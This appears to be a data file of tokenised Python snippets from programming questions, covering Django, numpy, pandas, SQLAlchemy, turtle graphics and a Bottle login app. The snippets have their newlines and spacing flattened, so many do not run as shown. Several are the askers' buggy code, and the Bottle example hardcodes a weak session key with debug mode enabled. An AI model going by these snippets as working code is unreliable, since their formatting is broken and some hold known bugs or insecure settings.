"LOGGING = { 'version ' : 1 , 'disable_existing_loggers ' : False , 'formatters ' : { 'verbose ' : { 'format ' : `` [ % ( asctime ) s ] % ( levelname ) s [ % ( name ) s : % ( lineno ) s ] % ( message ) s '' , 'datefmt ' : `` % d/ % b/ % Y % H : % M : % S '' } , 'simple ' : { 'format ' : ' % ( levelname ) s % ( message ) s ' } , } , 'handlers ' : { 'file ' : { 'level ' : 'WARNING ' , 'class ' : 'logging.FileHandler ' , 'filename ' : 'myapp.log ' , 'formatter ' : 'verbose ' } , } , 'loggers ' : { 'django ' : { 'handlers ' : [ 'file ' ] , 'propagate ' : True , 'level ' : 'WARNING ' , } , 'myapp ' : { 'handlers ' : [ 'file ' ] , 'level ' : 'WARNING ' , } , } }"
"# my version : max_q = max ( [ x for x in self.getQValues ( state ) ] ) # reference version which worked : max_q = max ( x for x in self.getQValues ( state ) ) # worksmax_q = max ( self.getQValue ( nextState , action ) for action in legal_actions ) # does n't work ( i.e. , provides different results ) max_q = max ( [ self.getQValue ( nextState , action ) for action in legal_actions ] )"
"$ pythonPython 2.6.6 ( r266:84292 , Dec 7 2011 , 20:48:22 ) [ GCC 4.4.6 20110731 ( Red Hat 4.4.6-3 ) ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > u'\U00000020 ' u ' ' > > > u'\U00000065 ' u ' e ' > > > u'\U0000FFFF ' u'\uffff ' > > > u'\U00010000 ' u'\U00010000 ' > > > len ( u'\U00010000 ' ) 1 > > > ord ( u'\U00010000 ' ) 65536 $ pythonPython 2.6.7 ( r267:88850 , Jul 31 2011 , 19:30:54 ) [ GCC 4.2.1 ( Based on Apple Inc. build 5658 ) ( LLVM build 2335.15.00 ) ] on darwin > > > u'\U00000020 ' u ' ' > > > u'\U00000065 ' u ' e ' > > > u'\U0000FFFF ' u'\uffff ' > > > u'\U00010000 ' u'\U00010000 ' > > > len ( u'\U00010000 ' ) 2 > > > ord ( u'\U00010000 ' ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > TypeError : ord ( ) expected a character , but string of length 2 found"
"for task in tasks : tools.debug ( `` add_tasks_to_process_files '' , `` adding_task '' ) taskqueue.add ( \ name= ( `` Process_ % s_files -- - % s -- % s -- % s -- % s '' % \ ( len ( tasks [ task ] ) , task [ 1 ] , task [ 0 ] , task [ 2 ] , int ( time.time ( ) ) ) ) , \ queue_name= '' files-processor '' , \ url= '' /analytics/process_files/ '' , \ params= { `` processing_task '' : json.dumps ( { `` profile '' : task , `` blobs_to_process '' : tasks [ task ] } ) } ) { ( x1 , y1 , z1 ) : [ `` blob_key '' , `` blob_key '' ... ( limited to 35 keys ) ] , ( x2 , y2 , z2 ) : [ `` blob_key '' , `` blob_key '' ... ] , . . . } def debug ( location , message , params=None , force=False ) : if not ( settings.REMOTE_DEBUG or settings.LOCALE_DEBUG or force ) : return if params is None : params = { } params [ `` memory '' ] = runtime.memory_usage ( ) .current ( ) params [ `` instance_id '' ] = settings.INSTANCE_ID debug_message = `` % s/ % s ? % s '' % ( urllib2.quote ( location ) , urllib2.quote ( message ) , `` & '' .join ( [ `` % s= % s '' % ( p , urllib2.quote ( unicode ( params [ p ] ) .encode ( `` utf-8 '' ) ) ) for p in params ] ) ) if settings.REMOTE_DEBUG or force : fetch ( `` % s/ % s '' % ( settings.REMOTE_DEBUGGER , debug_message ) ) if settings.LOCALE_DEBUG or force : logging.debug ( debug_message ) /add_tasks_to_process_files/ 500 98812ms 0kb instance=0 AppEngine-Google ; ( +http : //code.google.com/appengine ) : A serious problem was encountered with the process that handled this request , causing it to exit . This is likely to cause a new process to be used for the next request to your application . If you see this message frequently , you may have a memory leak in your application . ( Error code 201 ) /_ah/stop 500 110ms 0kbExceeded soft private memory limit with 283.406 MB after servicing 1 requests total 1 2012-1-19 14:41:38 [ processors-backend ] processors-backend-initiated instance_id : 1329662498 , memory : 18.05078125 , backend_instance_url : http : //0.processors.razoss-dock-dev.appspot.com , backend_load_balancer_url : http : //processors.razoss-dock-dev.appspot.com2 2012-1-19 14:41:39 [ AddTasksToProcessFiles ] start instance_id : 1329662498 , files_sent_to_processing_already_in_previous_failed_attempts : 0 , memory : 19.38281253 2012-1-19 14:41:59 [ AddTasksToProcessFiles ] add_tasks_to_process_files-LOOP_END total_tasks_to_add : 9180 , total_files_added_to_tasks : 9184 , task_monitor.files_sent_to_processing : 0 , total_files_on_tasks_dict : 9184 , instance_id : 1329662498 , memory : 56.527343754 2012-1-19 14:42:0 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 57.816406255 2012-1-19 14:42:0 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 57.816406256 2012-1-19 14:42:1 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 57.93757 2012-1-19 14:42:2 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 57.93758 2012-1-19 14:42:2 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 58.03125 ... 2183 2012-1-19 14:53:45 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 280.660156252184 2012-1-19 14:53:45 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 280.660156252185 2012-1-19 14:53:45 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 281.02 186 2012-1-19 14:53:46 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 281.02187 2012-1-19 14:53:46 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 281.02188 2012-1-19 14:53:46 [ add_tasks_to_process_files ] adding_task instance_id : 1329662498 , memory : 281.3828125"
"import sysimport astfile = open ( 'emojidescription.json ' , ' r ' ) .read ( ) non_bmp_map = dict.fromkeys ( range ( 0x10000 , sys.maxunicode + 1 ) , 0xfffd ) emoji_dictionary = ast.literal_eval ( file.translate ( non_bmp_map ) ) # word = word.replaceAll ( `` , '' , `` `` ) ; keys = list ( emoji_dictionary [ `` emojis '' ] [ 0 ] .keys ( ) ) values = list ( emoji_dictionary [ `` emojis '' ] [ 0 ] .values ( ) ) file_write = open ( 'output.txt ' , ' a ' ) print ( len ( keys ) ) for i in range ( len ( keys ) ) : try : content = 'word = word.replace ( `` { 0 } '' , `` { 1 } '' ) '.format ( keys [ i ] , values [ i ] [ 0 ] ) except Exception as e : content = 'word = word.replace ( `` { 0 } '' , `` { 1 } '' ) '.format ( keys [ i ] , '' ) # file.write ( ) # print ( keys [ i ] , values [ i ] ) print ( content ) file_write.close ( ) { `` emojis '' : [ { `` ‍ '' : [ `` Graduate '' ] , `` © '' : [ `` Copy right '' ] , `` ® '' : [ `` Registered '' ] , `` ‍‍ '' : [ `` family '' ] , `` ‍❤️‍‍ '' : [ `` love '' ] , `` ™ '' : [ `` trademark '' ] , `` ‍❤‍ '' : [ `` love '' ] , `` ⌚ '' : [ `` time '' ] , `` ⌛ '' : [ `` wait '' ] , `` ⭐ '' : [ `` star '' ] , `` '' : [ `` Elephant '' ] , `` '' : [ `` Cat '' ] , `` '' : [ `` ant '' ] , `` '' : [ `` cock '' ] , `` '' : [ `` cock '' ] ,"
import mymodulemymodule.fun_using_main_interpreter_globals1 ( ) mymodule.fun_using_main_interpreter_globals1 ( explicit_pass= globals ( ) )
"In [ 198 ] : x = np.array ( [ [ 1,2,3 ] , [ 4,5,6 ] ] ) In [ 201 ] : x0 = x [ 0 ] In [ 202 ] : x0 is x [ 0 ] Out [ 202 ] : False In [ 205 ] : c = [ [ 1,2,3 ] , [ 1 ] ] In [ 206 ] : c0 = c [ 0 ] In [ 207 ] : c0 is c [ 0 ] Out [ 207 ] : True"
"from typing import Listclass Animal ( ) : passclass Dog ( Animal ) : def __init__ ( self ) - > None : super ( ) def bark ( self ) - > None : passclass Cat ( Animal ) : def __init__ ( self ) - > None : super ( ) def meow ( self ) - > None : passarr1 : List [ Dog ] = [ Dog ( ) , Dog ( ) ] arr2 : List [ Animal ] = [ Dog ( ) , Dog ( ) ] # error : Incompatible types in assignment ( expression has type `` List [ Dog ] '' , variable has type `` List [ Animal ] '' ) arr3 : List [ Animal ] = arr1"
"ax3d.contourf ( X , Y , dbz [ z25 , : , : ] , zdir= ' z ' , offset=0 , levels=levels , cmap='pymeteo_radar ' , alpha=0.50 ) # ! /usr/bin/env pythonimport numpy as npimport matplotlib.pyplot as pltimport mpl_toolkits.mplot3d.axes3d as p3data=np.array ( [ [ 53.9751 , 51.5681 , 50.7119 , 51.1049 , 51.5339 , 51.4977 , 51.2387,50.761 , 50.1732 , 49.8218 , 49.5442 , 48.936 , 47.4498 , 46.6484 , 45.8542 , 45.136 , 44.5268 , 44.071 , 43.7665 , 43.5928 , 43.5269 , 43.5385 , 43.6053 , 45.565 , 47.0071 , 46.8664 , 47.372 , 47.8324 , 48.295 , 48.731 , 49.0522 , 49.4001 , 49.7111 , 49.9919 , 50.2527 , 50.4928 , 50.7135 , 50.8831 , 51.0806 , 51.2683 ] , [ 55.6671 , 52.53 , 50.7764 , 50.5632 , 51.2095 , 51.5659 , 51.521 , 51.2143 , 50.653 , 50.2371 , 49.989 , 49.8089 , 49.6058 , 47.8355 , 47.3124 , 46.7346 , 46.1616 , 45.6498 , 45.2462 , 44.967 , 44.8005 , 44.7284 , 44.7295 , 44.7869 , 46.959 , 45.0194 , 46.73 , 48.0766 , 48.9395 , 49.5325 , 49.8498 , 50.1887 , 50.4798 , 50.7406 , 50.9808 , 51.2003 , 51.4074 , 51.555 , 51.7429 , 51.9218 ] , [ 56.6513 , 53.5919 , 51.2774 , 50.3133 , 50.7705 , 51.533 , 51.8287 , 51.7083 , 51.2816 , 50.7933 , 50.4806 , 50.2671 , 50.1009 , 50.0096 , 49.9052 , 49.4698 , 47.4655 , 47.0717 , 46.6849 , 46.3583 , 46.1122 , 45.952 , 45.8678 , 45.8485 , 45.8811 , 45.956 , 46.0634 , 47.2225 , 49.4363 , 50.2482 , 50.527 , 50.8558 , 51.1358 , 51.3809 , 51.607 , 51.8179 , 52.0161 , 52.1454 , 52.3263 , 52.497 ] , [ 57.078 , 54.3224 , 52.0759 , 50.4679 , 50.4677 , 51.297 , 52.0284 , 52.1594 , 51.9395 , 51.5518 , 51.1419 , 50.8765 , 50.6686 , 50.5101 , 50.4078 , 50.3473 , 50.3592 , 50.3813 , 49.7504 , 47.55 , 47.324 , 47.1365 , 46.9978 , 46.9119 , 46.8743 , 46.8811 , 46.9257 , 47.0013 , 50.0148 , 50.9106 , 51.1133 , 51.4282 , 51.7064 , 51.943 , 52.1587 , 52.3597 , 52.4789 , 52.6631 , 52.8359 , 52.9966 ] , [ 57.3835 , 54.9025 , 52.8571 , 50.9842 , 50.5197 , 51.1494 , 52.0599 , 52.4732 , 52.4716 , 52.2656 , 51.9535 , 51.6068 , 51.3466 , 51.1513 , 50.9708 , 50.8321 , 50.7639 , 50.7944 , 50.8817 , 49.8122 , 48.2038 , 48.086 , 47.9704 , 47.8735 , 47.8035 , 47.7644 , 47.7574 , 47.7803 , 50.8194 , 51.5486 , 51.6645 , 51.9745 , 52.2349 , 52.4508 , 52.6481 , 52.8317 , 52.9412 , 53.1097 , 53.2699 , 53.4171 ] , [ 57.9157 , 55.6092 , 53.6306 , 51.8011 , 50.9372 , 51.2615 , 52.1406 , 52.7436 , 52.8528 , 52.7829 , 52.6322 , 52.403 , 52.1149 , 51.866 , 51.6624 , 51.4773 , 51.317 , 51.2183 , 51.2153 , 51.1367 , 48.5913 , 48.6216 , 48.6218 , 48.5951 , 48.5589 , 48.527 , 48.5081 , 50.5185 , 51.6998 , 51.905 , 52.2258 , 52.4891 , 52.7062 , 52.8926 , 53.0655 , 53.2251 , 53.3262 , 53.4755 , 53.6169 , 53.7471 ] , [ 58.6093 , 56.432 , 54.307 , 52.6277 , 51.584 , 51.6482 , 52.3762 , 53.0685 , 53.2545 , 53.217 , 53.1356 , 53.0351 , 52.8481 , 52.6154 , 52.39 , 52.177 , 51.9977 , 51.843 , 51.7172 , 51.4587 , 48.7481 , 48.7984 , 48.864 , 48.9291 , 48.9843 , 49.0228 , 50.496 , 51.8667 , 52.3404 , 52.4759 , 52.6889 , 52.8851 , 53.0525 , 53.2072 , 53.354 , 53.4576 , 53.5925 , 53.7217 , 53.8432 , 53.956 ] , [ 58.9719 , 56.9885 , 54.8768 , 53.3526 , 52.3025 , 52.2089 , 52.7762 , 53.4444 , 53.6768 , 53.6706 , 53.5692 , 53.5162 , 53.4373 , 53.2886 , 53.1113 , 52.9065 , 52.6988 , 52.5193 , 52.3544 , 52.0384 , 48.9624 , 48.9653 , 49.0005 , 49.0574 , 49.1258 , 50.692 , 51.9726 , 52.4309 , 52.699 , 52.8194 , 52.9845 , 53.1336 , 53.2669 , 53.393 , 53.5118 , 53.6086 , 53.7213 , 53.8293 , 53.9308 , 54.026 ] , [ 58.5754 , 56.945 , 55.068 , 53.7798 , 52.9469 , 52.854 , 53.3136,53.8929 , 54.1205 , 54.1178 , 54.0128 , 53.9289 , 53.8906 , 53.8239,53.717 , 53.5724 , 53.3818 , 53.1892 , 53.009 , 49.3078 , 49.2524,49.2165 , 49.2032 , 49.2187 , 50.463 , 51.9497 , 52.4487 , 52.7041,52.8358 , 52.9776 , 53.1101 , 53.2293 , 53.3419 , 53.4487 , 53.5401,53.6365 , 53.7301 , 53.8205 , 53.9062 , 53.9869 ] , [ 57.623 , 56.547 , 55.0117 , 54.0512 , 53.5372 , 53.5246 , 53.927,54.3868 , 54.5828 , 54.5811 , 54.4501 , 54.3235 , 54.2626 , 54.2334,54.1802 , 54.1137 , 53.9897 , 53.8202 , 49.796 , 49.6864 , 49.5946,49.5216 , 49.4703 , 49.4432 , 51.8479 , 52.5574 , 52.8359 , 52.9722,53.0827 , 53.1826 , 53.2747 , 53.3597 , 53.4405 , 53.5138 , 53.5944,53.6751 , 53.7536 , 53.829 , 53.9019 , 53.9721 ] , [ 56.902 , 56.0005 , 54.9159 , 54.3352 , 54.123 , 54.2014 , 54.5659,54.8917 , 55.0307 , 55.0139 , 54.8838 , 54.7044 , 54.5863 , 54.5548,54.5258 , 54.4957 , 54.4633 , 51.4821 , 50.1897 , 50.0758 , 49.9683,49.8704 , 49.7842 , 51.5064 , 52.7625 , 53.0724 , 53.1926 , 53.2682,53.3404 , 53.4119 , 53.4831 , 53.5517 , 53.6169 , 53.6763 , 53.7383,53.8009 , 53.8644 , 53.9281 , 53.9905 , 54.0517 ] , [ 56.3455 , 55.5524 , 54.9336 , 54.6836 , 54.703 , 54.8657 , 55.1749,55.3844 , 55.4521 , 55.4019 , 55.2622 , 55.0281 , 54.8981 , 54.6591,54.7866 , 54.7678 , 54.7654 , 54.0436 , 54.2302 , 52.2533 , 50.3305,50.2276 , 50.1268 , 52.9617 , 53.4395 , 53.5504 , 53.5481 , 53.5524,53.5699 , 53.6014 , 53.644 , 53.6931 , 53.7445 , 53.7996 , 53.8548,53.9097 , 53.9655 , 54.0229 , 54.0813 , 54.1393 ] , [ 55.7493 , 55.3019 , 55.1012 , 55.0906 , 55.234 , 55.4751 , 55.7134,55.8462 , 55.8461 , 55.7425 , 55.5725 , 55.3535 , 55.1612 , 54.958,55.0193 , 54.9584 , 54.9531 , 54.8886 , 54.8256 , 54.2211 , 50.6477,50.5564 , 53.0546 , 53.8592 , 54.08 , 54.0288 , 53.9509 , 53.8796,53.8307 , 53.8073 , 53.8034 , 53.8142 , 53.8383 , 53.8725 , 53.9128,53.9558 , 54.0013 , 54.0497 , 54.103 , 54.1597 ] , [ 55.2575 , 55.1664 , 55.3165 , 55.5004 , 55.7345 , 55.9901 , 56.1852,56.2599 , 56.2027 , 56.0454 , 55.818 , 55.5754 , 55.302 , 55.2083,55.0224 , 55.1415 , 55.0656 , 55.0446 , 55.0263 , 54.7728 , 50.8924,53.4671 , 54.2587 , 54.5146 , 54.6171 , 54.519 , 54.3857 , 54.2497,54.1355 , 54.0509 , 53.9932 , 53.9584 , 53.941 , 53.939 , 53.9527,53.9798 , 54.0111 , 54.0465 , 54.0868 , 54.1339 ] , [ 54.8665 , 55.1533 , 55.5095 , 55.8512 , 56.1541 , 56.3995 , 56.5593,56.6009 , 56.5079 , 56.3001 , 56.0178 , 55.7187 , 55.448 , 55.063,55.2016 , 55.2116 , 55.1817 , 55.112 , 55.1099 , 55.0299 , 54.3358,54.6966 , 54.9199 , 55.0156 , 55.0728 , 54.975 , 54.8299 , 54.6609,54.493 , 54.3475 , 54.2349 , 54.1517 , 54.0928 , 54.0516 , 54.0245,54.013 , 54.0206 , 54.0404 , 54.0667 , 54.0989 ] , [ 54.2676 , 55.1132 , 55.6112 , 56.09 , 56.428 , 56.6661 , 56.8056,56.8374 , 56.7339 , 56.4923 , 56.1474 , 55.7977 , 55.4805 , 55.2341,54.8999 , 55.2662 , 55.2927 , 55.185 , 55.1237 , 55.1268 , 54.9772,55.1418 , 55.2612 , 55.3333 , 55.379 , 55.3244 , 55.2153 , 55.0629,54.881 , 54.6926 , 54.523 , 54.3866 , 54.2855 , 54.2118 , 54.1583,54.1191 , 54.0935 , 54.0834 , 54.0885 , 54.1057 ] , [ 54.1771 , 55.0795 , 55.7075 , 56.1772 , 56.5183 , 56.7522 , 56.8898,56.9315 , 56.8427 , 56.6056 , 56.2317 , 55.8095 , 55.4436 , 55.183,55.0284 , 54.9504 , 55.2833 , 55.2563 , 55.1498 , 55.1342 , 55.1331,55.259 , 55.3705 , 55.4452 , 55.4955 , 55.5087 , 55.4697 , 55.3766,55.2324 , 55.049 , 54.8485 , 54.6578 , 54.4995 , 54.3822 , 54.3002,54.2427 , 54.2022 , 54.1749 , 54.1598 , 54.1561 ] , [ 53.9112 , 54.85 , 55.6641 , 56.0844 , 56.4062 , 56.6232 , 56.757,56.8149 , 56.7669 , 56.5754 , 56.2311 , 55.785 , 55.366 , 55.0104,54.812 , 54.8845 , 55.1273 , 55.2339 , 55.1976 , 55.1049 , 55.0913,55.1843 , 55.3048 , 55.4076 , 55.4709 , 55.518 , 55.5455 , 55.5329,55.4636 , 55.3349 , 55.1595 , 54.9529 , 54.7462 , 54.5681 , 54.4342,54.3439 , 54.2848 , 54.2446 , 54.2222 , 54.2135 ] , [ 53.9368 , 54.9196 , 55.4408 , 55.7999 , 56.0652 , 56.2423 , 56.348,56.4106 , 56.4114 , 56.3028 , 56.0519 , 55.6779 , 55.2493 , 54.8836,54.6592 , 54.6347 , 54.8341 , 55.0606 , 55.1396 , 55.0967 , 55.0325,55.0501 , 55.1451 , 55.2627 , 55.3559 , 55.4216 , 55.4789 , 55.5183,55.5245 , 55.4779 , 55.3701 , 55.2072 , 55.0029 , 54.7876 , 54.5915,54.4378 , 54.3368 , 54.2787 , 54.2415 , 54.2271 ] , [ 53.9325 , 54.6506 , 55.0421 , 55.2926 , 55.4603 , 55.5679 , 55.6285,55.6792 , 55.7234 , 55.731 , 55.639 , 55.3923 , 55.043 , 54.6845,54.4188 , 54.3242 , 54.4606 , 54.7449 , 54.9548 , 55.0171 , 55.0047,54.9454 , 54.9666 , 55.0651 , 55.1828 , 55.2677 , 55.3308 , 55.3914,55.438 , 55.4544 , 55.4277 , 55.3385 , 55.1907 , 54.9981 , 54.7786,54.5691 , 54.4013 , 54.2898 , 54.233 , 54.1994 ] ] ) fig = plt.figure ( ) ax = fig.add_subplot ( 111 , projection='3d ' ) X , Y = np.meshgrid ( np.arange ( -30.0 , -20.0,0.25 ) , np.arange ( 20.0,25,0.25 ) ) ax.contourf ( X , Y , data , zdir= ' z ' , offset=0 , levels=np.arange ( 0,75,1 ) ) ax.set_zlim ( 0.0,2.0 ) plt.savefig ( 'testfig.png ' ) plt.close ( )"
"def gx ( ) : for i in [ 1 , 2 , 3 ] : yield idef gy ( ) : for i in [ 11 , 12 , 13 ] : yield idef gz ( ) : `` '' '' this should defer to gx and gy to generate [ 1 , 2 , 3 , 11 , 12 , 13 ] '' '' '' for i in gx ( ) : yield i for i in gy ( ) : yield i"
"inputs0 [ 1 , 2 , 3 ] 1 [ 4 , 5 , 6 ] 2 [ 7 , 8 , 9 ] 3 [ 10 , 11 , 12 ] array ( [ [ 1 , 2 , 3 ] , [ 4 , 5 , 6 ] , [ 7 , 8 , 9 ] , [ 10 , 11 , 12 ] ] ) array ( [ [ 1 , 2 , 3 ] , [ 4 , 5 , 6 ] , [ 7 , 8 , 9 ] , [ 10 , 11 , 12 ] ] , dtype=object )"
def test ( data ) : if data > 0 : # Pass the test
"import turtlewn = turtle.Screen ( ) # Set up the windowwn.bgcolor ( `` lightgreen '' ) alex = turtle.Turtle ( ) # Create Alexalex.color ( `` blue '' ) alex.pensize ( 3 ) for i in range ( 20 ) : # Here I start drawing the lines alex.forward ( 100 ) alex.backward ( 100 ) alex.left ( 360/20 ) # Fit 20 lines in the 360 degree circlewn.mainloop ( ) import turtledef draw_square ( turtle , size ) : for i in range ( 4 ) : turtle.forward ( size ) turtle.left ( 90 ) wn = turtle.Screen ( ) # Set up the windowwn.bgcolor ( `` lightgreen '' ) alex = turtle.Turtle ( ) # Create Alexalex.color ( `` blue '' ) alex.pensize ( 3 ) for i in range ( 20 ) : # Here I start drawing the lines alex.forward ( 100 ) alex.backward ( 100 ) alex.left ( 360/20 ) # Fit 20 lines in the 360 degree circle # In a messy way , using what I 've learned , I move Alex to where he 's supposed to be now # I 'm pretty sure there 's a classier way to do thisalex.penup ( ) alex.backward ( 100 ) alex.right ( 90 ) alex.forward ( 100 ) alex.left ( 90 ) alex.pendown ( ) # Here I get Alex to draw the squaredraw_square ( alex , 200 ) wn.mainloop ( )"
class Distribution ( models.Model ) : name = models.CharField ( max_length=32 ) class Component ( models.Model ) : distribution = models.ForeignKey ( Distribution ) percentage = models.IntegerField ( ) class ComponentInline ( admin.TabularInline ) : model = Component extra = 1class DistributionAdmin ( admin.ModelAdmin ) : inlines = [ ComponentInline ] # ... Inside the Distribution modeldef clean ( self ) : # Sum of components must be 100 total_sum = sum ( comp.percentage for comp in self.component_set.all ( ) ) if total_sum ! = 100 : raise ValidationError ( 'Sum of components must be 100 % ' )
"from cork import Corkfrom cork.backends import MongoDBBackendfrom bottle import Bottle , redirect , static_file , request , response , HTTPResponse , HTTPError , abort , debug , run , routeimport bottlefrom beaker.middleware import SessionMiddlewareimport pymongosession_opts = { 'session.type ' : 'cookie ' , 'session.validate_key ' : True , 'session.cookie_expires ' : True , 'session.timeout ' : 3600 * 24 , # 1 day 'session.encrypt_key ' : 'lxy3344 ' , } app = bottle.app ( ) app = SessionMiddleware ( app , session_opts ) mb = MongoDBBackend ( db_name='corkTry ' ) aaa = Cork ( backend=mb , email_sender='kkgghhyy @ gmail.com ' ) def postd ( ) : return bottle.request.formsdef post_get ( name , default= '' ) : return bottle.request.POST.get ( name , default ) .strip ( ) # LOGIN # # LOGIN # # LOGIN # # LOGIN # # LOGIN # # LOGIN # # LOGIN # @ bottle.route ( '/ ' ) @ bottle.get ( '/login ' ) def login ( ) : print aaa.current_user ( ) redirect ( '/static/login.html ' ) @ bottle.post ( '/login ' ) def login ( ) : print 'in post login ' `` '' '' Authenticate users '' '' '' username = post_get ( 'username ' ) password = post_get ( 'password ' ) aaa.login ( username , password , success_redirect='/home ' , fail_redirect='/login ' ) # REGISTER # # REGISTER # # REGISTER # # REGISTER # # REGISTER # # REGISTER # @ bottle.get ( '/register ' ) def register ( ) : redirect ( '/static/register.html ' ) @ bottle.post ( '/register ' ) def register ( ) : # Send out register email aaa.register ( post_get ( 'username ' ) , post_get ( 'password ' ) , post_get ( 'email_address ' ) ) return 'Please check your mailbox . ' @ bottle.route ( '/validate_registration/ : registration_code ' ) def validate_registration ( registration_code ) : # Validate registration , create user account aaa.validate_registration ( registration_code ) return 'Thanks . < a href= '' /login '' > Go to login < /a > ' @ bottle.route ( '/static/ < filepath : path > ' , method='GET ' ) def serve_static ( filepath ) : return static_file ( filepath , root='./static/ ' ) @ bottle.route ( '/home ' ) def home ( ) : return `` 'This is the home page '' 'bottle.debug ( True ) bottle.run ( app=app , reloader = True )"
"df [ 'new_var1 ' ] = df [ 'old_var1 ' ] .apply ( lambda x : transform1 ( x ) ) ... df [ 'new_var50 ' ] = df [ 'old_var50 ' ] .apply ( lambda x : transform50 ( x ) ) transform_dict = { 'new_var1 ' : lambda row : transform1 ( row ) , ... , 'new_var50 ' : lambda row : transform50 ( row ) } df = pd.concat ( [ df , df.apply ( lambda r : pd.Series ( { var : transform_dict [ var ] ( r ) for var in transform_dict.keys ( ) } ) , axis=1 ) ] , axis=1 )"
"def directionAverage ( x ) : result = np.arctan2 ( np.mean ( np.sin ( x ) ) , np.mean ( np.cos ( x ) ) ) if result < 0 : result += 2*np.pi return resultdef directionDescribe ( x ) : data = [ directionAverage ( x ) , x.std ( ) , x.min ( ) , x.quantile ( 0.25 ) , x.median ( ) , x.quantile ( 0.75 ) , x.max ( ) ] names = [ 'mean ' , 'std ' , 'min ' , '25 % ' , '50 % ' , '75 % ' , 'max ' ] return Series ( data , index=names ) df [ 'direction ' ] .resample ( '10Min ' , how=directionDescribe ) File `` C : \Python26\lib\site-packages\pandas\core\generic.py '' , line 234 , in resample return sampler.resample ( self ) File `` C : \Python26\lib\site-packages\pandas\tseries\resample.py '' , line 83 , in resample rs = self._resample_timestamps ( obj ) File `` C : \Python26\lib\site-packages\pandas\tseries\resample.py '' , line 217 , in _resample_timestamps result = grouped.aggregate ( self._agg_method ) File `` C : \Python26\lib\site-packages\pandas\core\groupby.py '' , line 1626 , in aggregate result = self._aggregate_generic ( arg , *args , **kwargs ) File `` C : \Python26\lib\site-packages\pandas\core\groupby.py '' , line 1681 , in _aggregate_generic return self._aggregate_item_by_item ( func , *args , **kwargs ) File `` C : \Python26\lib\site-packages\pandas\core\groupby.py '' , line 1706 , in _aggregate_item_by_item result [ item ] = colg.aggregate ( func , *args , **kwargs ) File `` C : \Python26\lib\site-packages\pandas\core\groupby.py '' , line 1357 , in aggregate result = self._aggregate_named ( func_or_funcs , *args , **kwargs ) File `` C : \Python26\lib\site-packages\pandas\core\groupby.py '' , line 1441 , in _aggregate_named raise Exception ( 'Must produce aggregated value ' )"
"[ [ 'Sometimes ' ] , [ ' ' ] , [ ' I ' ] , [ ' ' ] , [ 'love ' , 'hate ' ] , [ ' ' ] , [ 'pizza ' , 'coke ' ] ] [ 'Sometimes I love pizza ' , 'Sometimes I love coke ' , 'Sometimes I hate pizza ' , 'Sometimes I hate coke ' ]"
"tup = ' a ' , ' b ' , ' c ' , 'd ' tup = ( ' a ' , ' b ' , ' c ' , 'd ' )"
"> > > # Test 1 : Reset with a = [ ] ... > > > a = [ 1,2,3 ] > > > b = a > > > a = [ ] > > > a [ ] > > > b [ 1 , 2 , 3 ] > > > > > > # Test 2 : Reset with del a ... > > > a = [ 1,2,3 ] > > > b = a > > > del a > > > aTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > NameError : name ' a ' is not defined > > > b [ 1 , 2 , 3 ] > > > > > > # Test 3 : Reset with del a [ : ] ... > > > a = [ 1,2,3 ] > > > b = a > > > del a [ : ] > > > a [ ] > > > b [ ]"
"Base = declarative_base ( ) class Client ( Base ) : __tablename__ = `` clients '' id = Column ( Integer , primary_key=True ) created = Column ( DateTime , default=datetime.datetime.now ) name = Column ( String ) subjects = relationship ( `` Subject '' , cascade= '' all , delete '' , backref=backref ( `` client '' ) ) class Subject ( Base ) : __tablename__ = `` subjects '' id = Column ( Integer , primary_key=True ) client_id = Column ( Integer , ForeignKey ( Client.id , ondelete='CASCADE ' ) ) > > > Subject.clientAttributeError : type object 'Subject ' has no attribute 'client ' > > > session.query ( Client ) .first ( ) > > > Subject.client < sqlalchemy.orm.attributes.InstrumentedAttribute at 0x43ca1d0 >"
"In [ 1 ] : % timeit 10 / float ( 98765 ) 1000000 loops , best of 3 : 313 ns per loopIn [ 2 ] : % timeit 10 / ( 98765 * 1.0 ) 10000000 loops , best of 3 : 80.6 ns per loop"
"class Medications ( db.Model ) : __tablename__ = 'medications ' id = Column ( Integer , primary_key=True ) type = Column ( String ( 64 ) ) name = Column ( String ( 64 ) ) parent_id = Column ( Integer , ForeignKey ( 'medications.id ' ) ) children = relationship ( `` Medications '' ) `` objects '' : [ { `` children '' : [ { `` id '' : 4 , `` name '' : `` Child1 '' , `` parent_id '' : 3 , `` type '' : `` Leaf '' } , { `` id '' : 5 , `` name '' : `` Child2 '' , `` parent_id '' : 3 , `` type '' : `` Leaf '' } ] , `` id '' : 3 , `` name '' : `` CardioTest '' , `` parent_id '' : null , `` type '' : `` Parent '' } ] , class JsonSerializer ( object ) : `` '' '' A mixin that can be used to mark a SQLAlchemy model class which implements a : func : ` to_json ` method . The : func : ` to_json ` method is used in conjuction with the custom : class : ` JSONEncoder ` class . By default this mixin will assume all properties of the SQLAlchemy model are to be visible in the JSON output . Extend this class to customize which properties are public , hidden or modified before being being passed to the JSON serializer. `` '' '' __json_public__ = None __json_hidden__ = None __json_modifiers__ = None def get_field_names ( self ) : for p in self.__mapper__.iterate_properties : yield p.key def to_json ( self ) : field_names = self.get_field_names ( ) public = self.__json_public__ or field_names hidden = self.__json_hidden__ or [ ] modifiers = self.__json_modifiers__ or dict ( ) rv = dict ( ) for key in public : rv [ key ] = getattr ( self , key ) for key , modifier in modifiers.items ( ) : value = getattr ( self , key ) rv [ key ] = modifier ( value , self ) for key in hidden : rv.pop ( key , None ) return rv manager = flask.ext.restless.APIManager ( app , flask_sqlalchemy_db=db ) manager.create_api ( Medications , methods= [ 'GET ' ] ) `` objects '' : [ { `` children '' : [ { `` id '' : 4 , `` name '' : `` Child1 '' , `` parent_id '' : 3 , `` type '' : `` Leaf '' } , { `` id '' : 5 , `` name '' : `` Child2 '' , `` parent_id '' : 3 , `` type '' : `` Leaf 